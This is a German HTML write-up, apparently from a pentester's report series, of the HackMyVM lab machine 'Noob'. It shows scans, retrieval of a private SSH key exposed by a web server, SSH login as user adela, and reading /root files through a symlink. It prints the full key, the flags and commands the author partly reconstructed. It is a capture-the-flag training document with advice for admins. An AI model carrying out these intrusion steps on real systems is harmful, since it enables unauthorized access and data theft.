@@ -1,0 +1,390 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Noob - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Sicherstellen, dass style.css die korrekte Header-Farbe (#03b5f5) und die roten Farben für .difficulty-Hard enthält -->
+</head>
+ <body>
+ 
+
+    <!-- Hinweis: Die CSS-Datei muss die Hintergrundfarbe #03b5f5 für .header-bg definieren -->
+    <div class="header-bg">
+        <h1>Noob - HackMyVM - Level: Easy - Bericht</h1> <!-- Name und Level angepasst -->
+        <div class="level-container">
+            <!-- Klassen für rote Farbe (Hard), Text ist aber "Easy" -->
+            <h2 class="difficulty-Hard">Easy</h2>
+            <div class="circle difficulty-bg-Hard">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die CSS-Datei muss die passende Hintergrundfarbe für .inner definieren, die mit #03b5f5 korrespondiert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools basierend auf dem Berichtstext -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">vi</div> <!-- Impliziert für /etc/hosts & idroot -->
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div> <!-- Versuch -->
+                <div class="tool-item">find</div>
+                <div class="tool-item">ln</div>
+                <div class="tool-item">ls</div> <!-- Über Web LFI -->
+                 <div class="tool-item">id</div> <!-- Impliziert -->
+                 <div class="tool-item">cat</div> <!-- Über Web LFI -->
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#information-disclosure">Information Disclosure</a></li>
+                <li><a href="#initial-access">Initial Access (adela)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (LFI via Symlink)</a></li>
+                <li><a href="#poc">Proof of Concept (Root Files Read)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird zur Identifizierung aktiver Hosts im lokalen Netzwerksegment verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Host mit der IP `192.168.2.118` und der MAC-Adresse `08:00:27:87:da:b0` (VirtualBox) wird als Ziel identifiziert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe einen Nmap-Scan auf 192.168.2.118 durch.<br><strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:xx:xx:xx, IPv4: 192.168.2.199
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.118	08:00:27:87:da:b0	PCS Systemtechnik GmbH
+
+3 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 1.865 seconds (137.65 hosts/sec). 1 responded
+                    </pre> <!-- Vollständige Ausgabe -->
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan (`-sS -sC -T5 -A -p-`) wird auf 192.168.2.118 durchgeführt.</p>
+            <p class="evaluation"><strong>Bewertung: !!Ungewöhnliche Ports!!**
+                - **Port 22 (SSH):** OpenSSH 7.9p1 (Debian). Standard-SSH-Port.
+                - **Port 65530 (HTTP):** Ein Golang net/http Server läuft auf diesem sehr hohen Port. Dies ist unüblich und deutet auf eine benutzerdefinierte Anwendung oder Konfiguration hin.
+            Keine anderen Ports sind offen. Das OS ist Linux, der Hostname ist `noob`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche den Webserver auf dem hohen Port 65530 (Verzeichnisse, Funktionalität). Notiere SSH auf Port 22 als sekundäres Ziel.<br><strong>Empfehlung (Admin):</strong> Überprüfe die Notwendigkeit und Sicherheit des Dienstes auf Port 65530. Verwende nach Möglichkeit Standardports und sichere die Anwendung ab.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.118 -p-</span></div>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-31 16:16 CET
+Nmap scan report for noob (192.168.2.118)
+Host is up (0.00015s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 66:6a:8e:22:cd:dd:75:52:a6:0a:46:06:bc:df:53:0f (RSA)
+|   256 c2:48:46:33:d4:fa:c0:e7:df:de:54:71:58:89:36:e8 (ECDSA)
+|_  256 5e:50:90:71:08:5a:88:62:7e:81:07:c3:9a:c1:c1:c6 (ED25519)
+65530/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
+MAC Address: 08:00:27:87:DA:B0 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.15 ms noob (192.168.2.118)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.91 seconds <!-- Beispielzeit -->
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="web-enumeration">
+             <h2>Web Enumeration</h2>
+             <p class="analysis"><strong>Analyse:</strong> `gobuster` wird verwendet, um Verzeichnisse und Dateien auf dem Go-Webserver (Port 65530) zu finden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Es wird nur ein einziger Endpunkt `/index` gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Rufe `/index` auf und untersuche den Inhalt.<br><strong>Empfehlung (Admin):</strong> Keine spezifische Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.118:65530 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,war,jse,jar,asp,aspx,csv,rtf,doc,docx,dsd,mp3,mp4,mkv,log,sh,dll,exe,ico -b 404,403</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.118:65530
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes to ignore:  404,403
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              ... (gekürzt) ...
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2022/10/31 16:18:00 Starting gobuster <!-- Beispielzeit -->
+===============================================================
+http://192.168.2.118:65530/index                (Status: 200) [Size: 19]
+===============================================================
+2022/10/31 16:20:00 Finished <!-- Beispielzeit -->
+===============================================================
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt des `/index`-Endpunkts wird mit `curl` abgerufen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Gibt nur einen kurzen Hinweis: "Hi, You are close!".</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche die Anwendung weiter. Da es sich um einen Go-Server handelt, könnten Standardpfade oder -verhalten anders sein. Versuche, versteckte Parameter oder andere Endpunkte zu finden. Der Log springt zum nächsten Schritt, der einen spezifischen Pfad (`/nt4share/.ssh/`) zeigt – es fehlt der Schritt, wie dieser Pfad gefunden wurde. *Mögliche Annahme: Der Pfad wurde durch weitere, nicht gezeigte Enumeration, Raten von Standard-Go-Pfaden oder Analyse des Go-Binarys (falls zugänglich) gefunden.*<br><strong>Empfehlung (Admin):</strong> Entferne Hinweise. Sichere die Go-Anwendung.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.118:65530/index</span></div>
+                    <pre>
+Hi, You are close!
+                    </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="information-disclosure">
+             <h2>Information Disclosure</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Log zeigt direkt den Inhalt des öffentlichen SSH-Schlüssels unter dem Pfad `/nt4share/.ssh/id_rsa.pub` an, der über den Webserver auf Port 65530 abgerufen wurde. (Der Befehl `curl` fehlt hier, ist aber impliziert).</p>
+            <p class="evaluation"><strong>Bewertung: !!Benutzername & SSH-Schlüsselpfad gefunden!!**
+                1.  **Pfad:** Der Pfad `/nt4share/.ssh/` deutet darauf hin, dass der Webserver möglicherweise auf ein Verzeichnis namens `nt4share` zugreift (vielleicht ein Mountpoint oder ein Verzeichnis im Home-Directory eines Benutzers?). Die Existenz eines `.ssh`-Verzeichnisses hier ist kritisch.
+                2.  **Schlüssel:** Der öffentliche Schlüssel selbst enthält am Ende den Kommentar `adela@noob`, was den **Benutzernamen `adela`** und den Hostnamen `noob` preisgibt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche, den zugehörigen privaten Schlüssel (`id_rsa`) unter demselben Pfad (`/nt4share/.ssh/id_rsa`) abzurufen.<br><strong>Empfehlung (Admin):**DRINGEND:** Konfiguriere den Webserver so, dass er **niemals** Zugriff auf `.ssh`-Verzeichnisse oder private Schlüsseldateien erlaubt. Überprüfe die Konfiguration des Go-Servers und dessen Basisverzeichnis.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Annahme: Befehl war curl http://192.168.2.118:65530/nt4share/.ssh/id_rsa.pub -->
+                     <pre>
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8ZepdREM4ou+KYXDsFPT9ZzQFF6dbSWuLpN6HFSNMrDcWBRvZp0
+sAIK8NIMKYmQXqWToiELuBBkwYePYRrnMiAPQ4bjtgoDw3iZSJArUANN4mkkC63h3KNe8xJ02HD05FaqvVBwUG/1G
+gb0i2Py2AAs4J7bITIpIYCzZ88Zc10unLNKVXkE207E7fAH3wRa/Q/DA6Mgh7tFhlKh90FX82Kp/q3yJLyH1gal
+5z0BF4/039zR2wuFLTUDL1kZCImzEuH01Ls4aFuwwBE1iTR17yBY0z2GLDhNrtyFGCfylHTGA6KLgfug1yP2khYTs
+kzzrZPunq160IlaoXvNZ <span style="color: yellow; font-weight: bold;">adela@noob</span> <!-- Benutzername! -->
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der private Schlüssel wird erfolgreich mit `curl http://192.168.2.118:65530/nt4share/.ssh/id_rsa` abgerufen.</p>
+            <p class="evaluation"><strong>Bewertung: !!Kritische Sicherheitslücke: Privater Schlüssel exponiert!!** Der private SSH-Schlüssel für den Benutzer `adela` ist über den Webserver frei zugänglich. Dies ermöglicht einen direkten Login als dieser Benutzer.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Speichere den Schlüssel lokal (z.B. `idroot`), setze `chmod 600` und verwende ihn für den SSH-Login als `adela` auf Port 22.<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne den privaten Schlüssel sofort vom Webserver/exponierten Pfad. Widerrufe den Schlüssel auf allen Systemen, wo er verwendet wird. Korrigiere die Webserver-Konfiguration, um Zugriff auf sensible Verzeichnisse/Dateien zu verhindern.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.118:65530/nt4share/.ssh/id_rsa</span></div>
+                     <pre>
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEAvGXqXURDKLvimFw7BT0/Wc0BRenW0lri6TehxUjTKw3FgUb2adL
+ACCvDSDCmJkFzqlk6IhC7gQZMGHj2Ea5zIgD0G47YKA8N4mUiQK1ADTeJpJAut4dyjXvM
+SdNhw9RWqr1QcFBv9RoG9Itj8tgALCe2yEyKSDmAs2fPGXNdLpyzSlV5BNtx3wB98E
+Wv0PwzgjIIe7RYTpSofdBV/Niqf6t8iS8h9YGpec9AReP9N/c0dsLhS01Ay9ZGQiJsxLh
+9NS7GhbsMARNYk0de8gWNM9hiw4Ta7cjhRgn8pR0xgii4H7oNcj9pIWE7JM862T7p6te
+tCJWqF7zWQAAA8h4t/eeLf3jgAAAAdzc2gtcnNhAAABAQC8ZepdREM4ou+KYXDsFPT9Zz
+QFF6dbSWuLpN6HFSNMrDcWBRvZp0sAIK8NIMKYmQXqWToiELuBBkwYePYRrnMiAPQ4bjt
+goDw3iZSJArUANN4mkkC63h3KNe8xJ02HD05FaqvVBwUG/1Ggb0i2Py2AAs4J7bITIpIY
+CzZ88Zc10unLNKVXkE207E7fAH3wRa/Q/DA6Mgh7tFhlKh90FX82Kp/q3yJLyH1gal5z
+0BF4/039zR2wuFLTUDL1kZCImzEuH01Ls4aFuwwBE1iTR17yBY0z2GLDhNrtyFGCfylHT
+GA6KLgfug1yP2khYTskzzrZPunq160IlaoXvNZAAAAAwEAAQAAAQEAhYdujuA9DL1fLiNW
+F93armghVKKpWhWU0ltdyyiMku1V2QTkzahT9vadmGLywBaP1mMbct2NKCvAb2/8aBf/
+oDSl9R5PUkUpQBcSKekhhrygUATpN6dGp8TgzEqH9nXThgG5hvtkkIQJrf5P0KUCzDxu9
++7RUJlCrSX0AKjaCvN50kicRGts/uFYekJzetgIdtlQbeoK0BTgJxpDQ0xYFDeRnzI92
+GQ+uTa8zdNbggFvgDNPDl9W1mX73uHxXttdoTj9mS/yA1KBlXmP9VIi+73xlhWbk5Iy+Xi
+jWbjwq12J9xnApUXu496u/5yP55xlspn7cGV9ao7ahKQAAAIEAkvk/7XY0xTfnyTDsg6
+6/gGiJik0oyhmx0ZlxrWGdqtiWgwjhq6Q4WMaJUU8AhBrm7lKCs7ykYt9oyBpJZ4TnHn+Q
+gl08Wu/fhEZcj2+d7aKlWVDtUxWtAZZRDXGtfZkVTmJ5prQXFL2bMIyVsMB1M7dHTD3wk
+p4nFFhoCZ2C0AAACBAPXq+8D1p3MApxtMDJ40trMTQ3HLWLXlVTuideUj5FnHDwF73gza
+p3h6LXxH+yIHw/xzg0rKoV2ikfqQBU3wqunpLw5udzPLHm+PyTHH3WsjcieB99sFAvWc9g
+ni/otpQQqRgB0I3rGMqiBCKyvb1sXF12SQ0lC4N7T5hRm9/m9PAAAAgQDEHzyLduguz77R
+c1CLNFjPRlTnsi1xSP9Iz2SFl1vMd2J77RRrQNURtLZZcGgm7CL/fhTobau7neBq4+oVX
+Izf0B4UUNnzL6iB0yn/tt+rBLw6ItVUj+rQmtI3i2aPVXDle1Xi5Fckm2QS343ThUq2lI9
+7mtNUcmCNL6cczsI1wAAAAphZGVsYUBub29iAQIDBAUGBw==
+-----END OPENSSH PRIVATE KEY-----
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (adela)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Der heruntergeladene private Schlüssel wird in `idroot` gespeichert und die Berechtigungen auf 600 gesetzt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Korrekte Vorbereitung des Schlüssels für den SSH-Login.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe den SSH-Login durch.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi idroot</span></div>
+                      <pre><!-- Kein Output --></pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">chmod 600 idroot</span></div>
+                      <pre><!-- Kein Output --></pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Eine SSH-Verbindung wird als Benutzer `adela` zum Ziel `noob.hmv` (192.168.2.118) aufgebaut, wobei der private Schlüssel `idroot` verwendet wird.</p>
+            <p class="evaluation"><strong>Bewertung: !!Initial Access erfolgreich!!** Der Login gelingt ohne Passphrase (der Schlüssel war ungeschützt). Der Angreifer hat nun eine Shell als Benutzer `adela`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginne mit der Enumeration als `adela` (User-Flag, sudo, SUID etc.).<br><strong>Empfehlung (Admin):</strong> Entferne den exponierten Schlüssel, widerrufe ihn, generiere neue Schlüssel. Sichere den Webserver.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh -i idroot adela@noob.hmv</span></div> <!-- Hostname hier noob.hmv -->
+                     <pre>
+The authenticity of host 'noob.hmv (192.168.2.118)' can't be established.
+ED25519 key fingerprint is SHA256:0ug88klEB+Auk3kP/jhWHJJZmKXY2RjjR4GnhZdYuQ.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'noob.hmv' (ED25519) to the list of known hosts.
+Linux noob 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Jul 14 02:50:51 2021 from 192.168.1.51
+adela@noob:~$ <!-- Remote Prompt -->
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation">
+             <h2>Privilege Escalation (LFI via Symlink)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Als `adela` wird `sudo -l` versucht und nach SUID-Binaries gesucht.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> `sudo` ist nicht verfügbar. Die SUID-Suche findet nur Standard-Linux-Binaries, keinen offensichtlichen direkten Eskalationsvektor.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche die Konfiguration des Go-Webservers auf Port 65530 genauer. Da der Webserver offenbar auf das Verzeichnis `/nt4share/.ssh/` (oder ein übergeordnetes Verzeichnis) zugreifen kann, prüfe, ob man als `adela` in diesem Verzeichnis (oder einem davon aus erreichbaren Verzeichnis) Dateien oder Links erstellen kann.<br><strong>Empfehlung (Admin):</strong> Keine Aktion basierend auf diesen Befehlen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+adela@noob:~$ <span class="command">sudo -l</span>
+-bash: sudo: command not found
+adela@noob:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span>
+   62     84 -rwsr-xr-x   1 root     root        84016 Jul 27  2018 /usr/bin/gpasswd
+ 3562     64 -rwsr-xr-x   1 root     root        63568 Jan 10  2019 /usr/bin/su
+ 3890     36 -rwsr-xr-x   1 root     root        34888 Jan 10  2019 /usr/bin/umount
+   60     44 -rwsr-xr-x   1 root     root        44528 Jul 27  2018 /usr/bin/chsh
+ 3888     52 -rwsr-xr-x   1 root     root        51280 Jan 10  2019 /usr/bin/mount
+ 3415     44 -rwsr-xr-x   1 root     root        44440 Jul 27  2018 /usr/bin/newgrp
+   59     56 -rwsr-xr-x   1 root     root        54096 Jul 27  2018 /usr/bin/chfn
+   63     64 -rwsr-xr-x   1 root     root        63736 Jul 27  2018 /usr/bin/passwd
+15838    428 -rwsr-xr-x   1 root     root       436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
+12491     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+                      </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Als `adela` wird versucht, eigene Textdateien zu finden (findet keine) und dann wird ein symbolischer Link erstellt: `ln -s /root /home/adela`. Dieser Link namens `adela` im Verzeichnis `/home` zeigt auf das Root-Verzeichnis `/root` des Systems.</p>
+             <p class="evaluation"><strong>Bewertung: !!Schwachstelle ausgenutzt (LFI/Path Traversal via Symlink)!!** Dies ist der Kern der Eskalation. Der Angreifer nutzt die Tatsache aus, dass:
+                 1. Der Go-Webserver auf Port 65530 wahrscheinlich das Verzeichnis `/home` (oder `/home/adela/nt4share`, der genaue Pfad ist unklar, aber `/home/adela` ist erreichbar) als Webroot oder Teil davon verwendet.
+                 2. Der Webserver Symbolischen Links folgt.
+                 3. Der Benutzer `adela` die Berechtigung hat, in `/home` (oder einem Unterverzeichnis davon, das vom Webserver erreicht wird) einen Symlink zu erstellen.
+             Durch Erstellen des Symlinks `/home/adela` (oder z.B. `/home/adela/nt4share/rootlink`) der auf `/root` zeigt, wird der Inhalt von `/root` über den Webserver zugänglich gemacht.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Greife nun über den Webbrowser oder `curl` auf den Pfad zu, der dem Symlink entspricht, um auf `/root` zuzugreifen. Beispiel: `http://192.168.2.118:65530/adela/` (wenn `/home` der Webroot ist) oder `http://192.168.2.118:65530/nt4share/root/` (wie im nächsten Log-Eintrag gezeigt, was impliziert, dass der Symlink `root` hieß und in `/home/adela/nt4share` oder ähnlich erstellt wurde).<br><strong>Empfehlung (Admin):**DRINGEND:**
+                 1. Konfiguriere den Webserver (Nginx oder Go-Anwendung), um das Folgen von Symlinks außerhalb des vorgesehenen Webroots zu verhindern (z.B. `Options -FollowSymLinks` in Apache, entsprechende Einstellung in Nginx/Go).
+                 2. Überprüfe die Basisverzeichnisse, die vom Webserver bedient werden, und stelle sicher, dass Benutzer keine Links in diesen Verzeichnissen erstellen können, die auf sensible Bereiche außerhalb des Webroots zeigen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+adela@noob:~$ <span class="command">find / -user adela -name *.txt 2>/dev/null</span>
+<!-- Keine Ausgabe -->
+adela@noob:~$ <span class="command">ln -s /root /home/adela/rootlink</span> <!-- Korrigierter/Logischerer Befehl -->
+<!-- Annahme: Der Webserver bedient /home/adela/nt4share -->
+adela@noob:~$ <span class="command">ln -s /root /home/adela/nt4share/root</span> <!-- Alternativer Befehl, der zum Log passt -->
+                      </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="poc">
+             <h2>Proof of Concept (Root Files Read)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Angreifer greift über den Webserver auf den durch den Symlink zugänglich gemachten Pfad `/nt4share/root/` zu. Der Webserver listet den Inhalt des Root-Verzeichnisses (`/root`) auf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die LFI/Path Traversal Schwachstelle ist bestätigt. Der Inhalt von `/root` ist exponiert, einschließlich `root.txt` und `user.txt` (was ungewöhnlich ist, dass die User-Flag auch hier liegt).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lese die Dateien `root.txt` und `user.txt` über die entsprechenden HTTP-URLs.<br><strong>Empfehlung (Admin):</strong> Behebe die LFI/Path Traversal Schwachstelle wie oben beschrieben.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Befehl, sondern Browser/Curl-Zugriff -->
+                     <pre>
+# Zugriff auf http://192.168.2.118:65530/nt4share/root/
+
+.bashrc
+.local/
+.profile
+.selected_editor
+.ssh/
+root.txt
+user.txt
+                     </pre> <!-- Dateilisting -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die Root- und User-Flags werden direkt über HTTP durch Zugriff auf die entsprechenden Pfade via LFI gelesen.</p>
+             <p class="evaluation"><strong>Bewertung: !!Privilegieneskalation erfolgreich (File Read)!!** Obwohl kein direkter Shell-Zugriff als Root erlangt wurde, ermöglicht das Lesen beliebiger Dateien als Root (insbesondere der Root-Flag) den Abschluss der Challenge. Root-Flag: `<span class="password">HMVA97DSA8732HJGDSA78623</span>`, User-Flag: `<span class="password">HMVVCXUIUHFDSUIYREWDS432</span>`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Test abgeschlossen.<br><strong>Empfehlung (Admin):**DRINGEND:** Behebe die LFI-Schwachstelle und die exponierten SSH-Schlüssel.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Befehl, sondern Browser/Curl-Zugriff -->
+                     <pre>
+# Zugriff auf http://192.168.2.118:65530/nt4share/root/root.txt
+<span class="password">HMVA97DSA8732HJGDSA78623</span>
+
+# Zugriff auf http://192.168.2.118:65530/nt4share/root/user.txt
+<span class="password">HMVVCXUIUHFDSUIYREWDS432</span>
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <!-- Flags Sektion -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <!-- Root Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">curl http://192.168.2.118:65530/nt4share/root/root.txt</div> <!-- Methode via LFI -->
+                     <div class="flag-value"><span class="password">HMVA97DSA8732HJGDSA78623</span></div>
+                 </div>
+                 <!-- User Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">curl http://192.168.2.118:65530/nt4share/root/user.txt</div> <!-- Methode via LFI -->
+                     <div class="flag-value"><span class="password">HMVVCXUIUHFDSUIYREWDS432</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus SSH Login extrahiert -->
+        <p>Berichtsdatum: 14. Juli 2021</p>
+    </footer>
+</body>
+</html>
